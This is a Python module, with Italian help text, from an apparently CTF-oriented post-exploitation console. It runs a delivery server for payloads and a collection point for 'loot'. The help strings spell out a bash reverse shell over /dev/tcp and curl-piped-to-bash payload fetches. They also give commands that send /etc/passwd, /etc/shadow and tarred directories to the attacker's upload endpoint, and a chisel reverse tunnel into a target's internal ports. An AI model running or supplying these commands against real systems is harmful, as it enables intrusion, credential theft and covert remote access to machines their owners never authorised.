from __future__ import annotations

import argparse
import sys

from http_server import (
    start as _serve_start,
    stop as _serve_stop,
    status as _serve_status,
    fetch_tools as _serve_fetch,
    list_static as _serve_list_static,
    discover_interfaces as _serve_discover_interfaces,
    list_loot as _serve_list_loot,
    read_loot as _serve_read_loot,
    clear_loot as _serve_clear_loot,
)
from http_server import (
    tunnel_fetch as _tunnel_fetch,
    tunnel_start as _tunnel_start,
    tunnel_stop as _tunnel_stop,
    tunnel_status as _tunnel_status,
    tunnel_list as _tunnel_list,
)
from http_server import set_lport as _set_lport

from sealion import normalize, render_markdown, _paged_print


def _autostart_server() -> None:
    """Ask for network interface and start the HTTP server automatically."""
    ifaces = _serve_discover_interfaces()
    if not ifaces:
        print("\033[93m[!]\033[0m Nessuna interfaccia di rete trovata, server non avviato.")
        return

    if len(ifaces) == 1:
        lhost = ifaces[0][1]
    else:
        print("\n  Interfacce disponibili:\n")
        for i, (name, addr) in enumerate(ifaces, 1):
            print(f"    [{i}] {name:<12s}  {addr}")
        print()
        while True:
            try:
                choice = input("  Scegli interfaccia per il server [1]: ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if not choice:
                choice = "1"
            if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                lhost = ifaces[int(choice) - 1][1]
                break
            print(f"  Inserisci un numero da 1 a {len(ifaces)}.")

    result = _serve_start(lhost=lhost)
    for line in result.splitlines():
        print(f"  {line}")
    print()


def _serve_help_main() -> None:
    render_markdown(r"""# Quick-Delivery Server

Server HTTP in background per post-exploitation.
Serve payload dinamici e file statici via `curl` dal target.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `serve on [--port N] [--lhost IP] [--lport N]` | Avvia (default: porta 2727, IP auto) |
| `serve off` | Arresta |
| `serve status` | Mostra stato corrente |
| `serve fetch [--force]` | Scarica i tool di post-exploitation in `static/` |
| `serve list` | Elenca i file in `static/` |
| `serve lport [porta]` | Mostra o cambia la porta per le reverse shell |

## Categorie di help

| Comando | Argomento |
|---------|-----------|
| `serve help upgrade` (o `u`) | Come fare l'upgrade di una shell instabile |
| `serve help upgrade2` (o `u2`) | Upgrade in-place (senza nuova connessione) |
| `serve help rev` (o `r`) | Reverse shell Bash |
| `serve help sh` | Reverse shell Python |
| `serve help static` (o `s`) | Gestione file statici e catalogo tool |
| `serve help loot` (o `l`) | Upload file dalla vulnbox e gestione loot |
""")


def _serve_help_upgrade() -> None:
    render_markdown(r"""# /upgrade — Upgrade Shell

Trasforma una shell instabile (es. netcat `/bin/sh`) in una TTY interattiva.

## Uso

```bash
curl http://<LHOST>:2727/upgrade | bash
```

## Prerequisito

Avvia un listener **socat** sulla tua macchina prima di lanciare il curl:

```bash
socat file:$(tty),raw,echo=0 tcp-listen:<LPORT>
```

## Cosa fa lo script

Tenta tre metodi in cascata:

1. **socat locale** — se già installato sul target, upgrade immediato
2. **socat statico** — scarica un binario precompilato, lo usa da `/tmp`
3. **python pty** — fallback con `python3 -c "import pty; ..."`

La connessione torna verso `LHOST:LPORT` configurati con `serve on`.
""")


def _serve_help_upgrade2() -> None:
    render_markdown(r"""# /upgrade2 — Upgrade In-Place

Upgrada la shell corrente a una TTY interattiva **senza aprire nuove connessioni**.
Ideale quando sei già dentro il target e vuoi una shell migliore direttamente lì.

## Uso

```bash
curl http://<LHOST>:2727/upgrade2 | bash
```

## Nessun prerequisito

Non serve un listener sulla tua macchina — lo script lavora solo sulla shell corrente.

## Cosa fa lo script

Tenta 9 metodi in cascata (usa il primo disponibile):

| # | Metodo | Comando | TTY piena |
|---|--------|---------|-----------|
| 1 | **python3 pty.fork** | Full PTY proxy con raw mode + resize | Sì |
| 2 | **python2 pty.fork** | Stesso approccio con python2 | Sì |
| 3 | **script** | `script -qc /bin/bash /dev/null` | Parziale |
| 4 | **expect** | `expect -c 'spawn /bin/bash; interact'` | Parziale |
| 5 | **perl** | `perl -e 'exec "/bin/sh";'` | No |
| 6 | **ruby** | `ruby -e 'exec "/bin/sh"'` | No |
| 7 | **lua** | `lua -e 'os.execute("/bin/sh")'` | No |
| 8 | **awk** | `awk 'BEGIN {system("/bin/sh")}'` | No |
| 9 | **/bin/sh -i** | Fallback diretto | No |

I metodi 1-2 (python) danno una TTY completa con frecce, Tab, history e resize.
I metodi 3-4 danno una TTY parziale. I metodi 5-9 spawnano una shell ma senza TTY.

## Differenza con /upgrade

| | `/upgrade` | `/upgrade2` |
|---|---|---|
| Connessione | Nuova reverse verso LHOST:LPORT | Nessuna, lavora in-place |
| Prerequisito | Listener (socat/nc) | Nessuno |
| TTY piena | Sì (socat) | Sì con python, parziale con altri |
| Quando usarlo | Vuoi una shell dedicata stabile | Vuoi upgradare quella che hai |
""")


def _serve_help_rev() -> None:
    render_markdown(r"""# /rev — Reverse Shell Bash

One-liner bash per ottenere una reverse shell.

## Uso

```bash
curl http://<LHOST>:2727/rev | bash
```

## Prerequisito

Listener sulla tua macchina:

```bash
nc -lvnp <LPORT>
```

## Payload generato

```bash
bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
```

`LHOST` e `LPORT` sono quelli impostati con `serve on`.
""")


def _serve_help_sh() -> None:
    render_markdown(r"""# /sh — Reverse Shell Python

One-liner Python3 per ottenere una reverse shell.
Utile quando bash non supporta `/dev/tcp` (es. Debian/Ubuntu con `dash`).

## Uso

```bash
curl http://<LHOST>:2727/sh | bash
```

## Prerequisito

```bash
nc -lvnp <LPORT>
```

## Quando usarlo

- Il target ha Python3 ma non bash con `/dev/tcp`
- Serve una shell più stabile rispetto a `/rev`
""")


def _serve_help_static() -> None:
    from http_server import TOOL_CATALOG, STATIC_ROOT, _lhost, _server
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:2727"

    lines = ["# static/ — File Statici\n"]
    lines.append("Cartella che il server serve come download diretto.")
    lines.append("Qualsiasi file dentro `static/` diventa scaricabile via HTTP.\n")
    lines.append("## Comandi\n")
    lines.append("| Comando | Descrizione |")
    lines.append("|---------|-------------|")
    lines.append("| `serve fetch` | Scarica tutti i tool del catalogo |")
    lines.append("| `serve fetch --force` | Riscarica anche se già presenti |")
    lines.append("| `serve list` | Mostra file e dimensioni |")
    lines.append("| `cp file static/` | Aggiungi un file manualmente |\n")
    lines.append("## Catalogo tool\n")
    lines.append("```bash")
    for entry in TOOL_CATALOG:
        name = entry["name"]
        if name.endswith(".sh"):
            lines.append(f"curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"curl {base}/{name} -o {name}")
        else:
            lines.append(f"curl {base}/{name} -o {name} && chmod +x {name}")
    lines.append("```")
    render_markdown("\n".join(lines))


def _loot_help() -> None:
    render_markdown(r"""# loot — Gestione File dalla Vulnbox

Ricevi e gestisci file caricati dalla vulnbox tramite `curl` sull'endpoint `/upload`.
I file vengono salvati nella cartella `loot/` con timestamp e IP sorgente.

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `loot` o `loot list` | Elenca i file ricevuti |
| `loot read <nome\|num>` | Mostra il contenuto di un file (solo testo) |
| `loot clear` | Elimina tutti i file loot |
| `loot help` | Mostra questo aiuto |

## Come caricare file dalla vulnbox

Dalla macchina vittima, usa `curl` per inviare file al server SLConsole:

```bash
# Upload file singolo (multipart form — il più comune)
curl -F "file=@/etc/passwd" http://<LHOST>:2727/upload

# Upload via pipe (utile per output di comandi)
cat /etc/shadow | curl -X POST -d @- http://<LHOST>:2727/upload/shadow.txt

# Upload con PUT (nome file nell'URL)
curl -T /tmp/database.db http://<LHOST>:2727/upload/database.db

# Esfiltra cartelle intere via tar
tar czf - /etc /var/log | curl -X POST -d @- http://<LHOST>:2727/upload/exfil.tar.gz

# Upload multipli in un colpo solo
for f in /etc/passwd /etc/shadow /etc/hosts; do
    curl -F "file=@$f" http://<LHOST>:2727/upload
done
```

## Dove finiscono i file

I file vengono salvati in `loot/` con il formato:

```
<IP_SORGENTE>_<DATA>_<ORA>_<NOME_ORIGINALE>
```

Esempio: `10.10.14.5_2024-01-15_14-30-22_passwd`

## Consultare i file

- **Console:** `loot list` per vedere i file, `loot read <num>` per il contenuto
- **Web:** sezione **Loot** nella barra di navigazione di SLWeb
- **Filesystem:** cartella `loot/` nella root del progetto
""")


_SERVE_HELP_TOPICS: dict[str, callable] = {
    "upgrade": _serve_help_upgrade,
    "u": _serve_help_upgrade,
    "upgrade2": _serve_help_upgrade2,
    "u2": _serve_help_upgrade2,
    "rev": _serve_help_rev,
    "r": _serve_help_rev,
    "sh": _serve_help_sh,
    "static": _serve_help_static,
    "s": _serve_help_static,
    "loot": _loot_help,
    "l": _loot_help,
}


def cmd_serve(args: argparse.Namespace, state=None) -> int:
    action = normalize(getattr(args, "action", "status"))
    subtopic = getattr(args, "subtopic", None)
    if action in {"help", "h", "-h", "--help"}:
        if subtopic:
            handler = _SERVE_HELP_TOPICS.get(normalize(subtopic))
            if handler:
                handler()
            else:
                print(f"Categoria sconosciuta: {subtopic}")
                print("Categorie: upgrade (u), upgrade2 (u2), rev (r), sh, static (s), loot (l)")
        else:
            _serve_help_main()
        return 0
    if action in {"on", "start"}:
        port = getattr(args, "port", 2727)
        lhost = getattr(args, "lhost", None)
        lport = getattr(args, "lport", None)

        if subtopic and subtopic.isdigit():
            port = int(subtopic)

        if lhost is None:
            ifaces = _serve_discover_interfaces()
            if not ifaces:
                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
                return 1
            if len(ifaces) == 1:
                lhost = ifaces[0][1]
            else:
                print("\n  Interfacce disponibili:\n")
                for i, (name, addr) in enumerate(ifaces, 1):
                    print(f"    [{i}] {name:<12s}  {addr}")
                print()
                while True:
                    try:
                        choice = input("  Scegli interfaccia [1]: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        return 0
                    if not choice:
                        choice = "1"
                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                        lhost = ifaces[int(choice) - 1][1]
                        break
                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")

        print(_serve_start(port=port, lhost=lhost, lport=lport))
        return 0
    if action in {"off", "stop"}:
        print(_serve_stop())
        return 0
    if action == "fetch":
        force = getattr(args, "force", False)
        print(_serve_fetch(force=force))
        return 0
    if action in {"list", "ls"}:
        print(_serve_list_static())
        return 0
    if action == "lport":
        if subtopic:
            try:
                port = int(subtopic)
            except ValueError:
                print(f"Porta non valida: {subtopic}")
                return 1
            print(_set_lport(port))
        else:
            from http_server import _lport
            print(f"LPORT attuale: \033[96m{_lport}\033[0m")
            print(f"  Cambia con: \033[93mserve lport <porta>\033[0m")
        return 0
    print(_serve_status())
    return 0


def cmd_loot(args: argparse.Namespace, state=None) -> int:
    action = normalize(getattr(args, "action", "list"))

    if action in {"help", "h", "-h", "--help"}:
        _loot_help()
        return 0

    if action in {"list", "ls", "l"}:
        print(_serve_list_loot())
        return 0

    if action in {"read", "cat", "show", "view"}:
        target = getattr(args, "target", None)
        if not target:
            print("Specifica il nome o il numero del file. Usa 'loot list' per vedere i file.", file=sys.stderr)
            return 1
        from http_server import _discover_loot
        items = _discover_loot()
        if target.isdigit():
            idx = int(target) - 1
            if 0 <= idx < len(items):
                target = items[idx]["name"]
            else:
                print(f"Indice {int(target)} fuori range (1-{len(items)}).", file=sys.stderr)
                return 1
        content = _serve_read_loot(target)
        if content is None:
            print(f"File non trovato: {target}", file=sys.stderr)
            return 1
        print(f"\n\033[1m--- {target} ---\033[0m\n")
        _paged_print(content.splitlines())
        return 0

    if action in {"clear", "clean", "purge"}:
        print(_serve_clear_loot())
        return 0

    print(f"Azione sconosciuta: {action}")
    print("Azioni disponibili: list, read <nome|num>, clear, help")
    return 1


def _tunnel_help() -> None:
    render_markdown(r"""# tunnel — Port Forwarding via chisel

Crea un tunnel reverse per accedere a servizi interni del target
(webapp su localhost, admin panel, ecc.) direttamente nel tuo browser.

## Requisiti

- **chisel** deve essere in `static/` — usa `tunnel fetch` per scaricarlo
- Il **serve** deve essere attivo (`serve on`) per servire il binario al target
- Il target deve poter raggiungere LHOST sulla porta del chisel server (default 8443)

## Comandi

| Comando | Descrizione |
|---------|-------------|
| `tunnel fetch [--force]` | Scarica chisel in `static/` |
| `tunnel on <porta>` | Avvia tunnel per la porta remota specificata |
| `tunnel off` | Chiudi chisel server e tutti i tunnel |
| `tunnel status` | Mostra stato del server e tunnel attivi |
| `tunnel list` | Elenca i tunnel attivi |
| `tunnel help` | Mostra questo aiuto |

## Opzioni

| Opzione | Default | Descrizione |
|---------|---------|-------------|
| `--local-port` | 9000 | Porta locale su cui mappare il tunnel |
| `--server-port` | 8443 | Porta del chisel server |

## Esempio tipico

```bash
# 1. Scarica chisel (solo la prima volta)
slconsole> tunnel fetch

# 2. Avvia tunnel per la porta 80 del target
slconsole> tunnel on 80

# 3. Copia il comando mostrato e incollalo nella revshell
curl http://LHOST:2727/static/chisel -o /tmp/chisel && \
  chmod +x /tmp/chisel && \
  /tmp/chisel client LHOST:8443 R:9000:127.0.0.1:80 &

# 4. Apri nel browser
http://localhost:9000

# 5. Tunnel multipli — ogni volta con porta locale diversa
slconsole> tunnel on 8080 --local-port 9001
```

## Note

- Se il target ha già `/tmp/chisel` in uso da un tunnel precedente, `curl` darà
  **Text file busy**. Nella revshell: `kill %1 2>/dev/null; rm -f /tmp/chisel`
  oppure usa un path diverso: `-o /tmp/chisel2`
""")


def cmd_tunnel(args: argparse.Namespace, state=None) -> int:
    action = normalize(getattr(args, "action", "status"))

    if action in {"help", "h", "-h", "--help"}:
        _tunnel_help()
        return 0

    if action in {"on", "start"}:
        port = getattr(args, "port", None)
        if port is None:
            try:
                raw = input("\n  Porta remota da forwardare: ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                return 0
            if not raw.isdigit():
                print("Specifica una porta numerica.", file=sys.stderr)
                return 1
            port = int(raw)
        local_port = getattr(args, "local_port", 9000)
        server_port = getattr(args, "server_port", 8443)
        lhost = getattr(args, "lhost", None)
        if lhost is None:
            ifaces = _serve_discover_interfaces()
            if not ifaces:
                print("Nessuna interfaccia di rete trovata.", file=sys.stderr)
                return 1
            if len(ifaces) == 1:
                lhost = ifaces[0][1]
            else:
                print("\n  Interfacce disponibili:\n")
                for i, (name, addr) in enumerate(ifaces, 1):
                    print(f"    [{i}] {name:<12s}  {addr}")
                print()
                while True:
                    try:
                        choice = input("  Scegli interfaccia [1]: ").strip()
                    except (EOFError, KeyboardInterrupt):
                        print()
                        return 0
                    if not choice:
                        choice = "1"
                    if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
                        lhost = ifaces[int(choice) - 1][1]
                        break
                    print(f"  Inserisci un numero da 1 a {len(ifaces)}.")
        print(_tunnel_start(remote_port=port, local_port=local_port,
                            server_port=server_port, lhost=lhost))
        return 0

    if action in {"off", "stop"}:
        print(_tunnel_stop())
        return 0

    if action == "fetch":
        force = getattr(args, "force", False)
        print(_tunnel_fetch(force=force))
        return 0

    if action in {"list", "ls"}:
        print(_tunnel_list())
        return 0

    print(_tunnel_status())
    return 0
